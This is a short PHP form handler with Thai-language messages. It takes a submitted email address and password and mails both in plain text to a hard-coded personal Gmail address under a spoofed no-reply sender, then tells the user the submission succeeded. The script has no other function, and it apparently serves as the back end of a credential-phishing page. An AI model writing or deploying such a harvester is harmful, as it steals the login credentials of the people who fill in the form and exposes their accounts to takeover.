<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $to = 'ja.thanakit03@gmail.com';
    $subject = 'ข้อมูลจากแบบฟอร์ม';
    $message = "อีเมล: $email\nรหัสผ่าน: $password";
    $headers = "From: no-reply@example.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "<p style='color:green;'>ส่งข้อมูลเรียบร้อยแล้ว!</p>";
    } else {
        echo "<p style='color:red;'>เกิดข้อผิดพลาดในการส่งข้อมูล</p>";
    }
}
?>
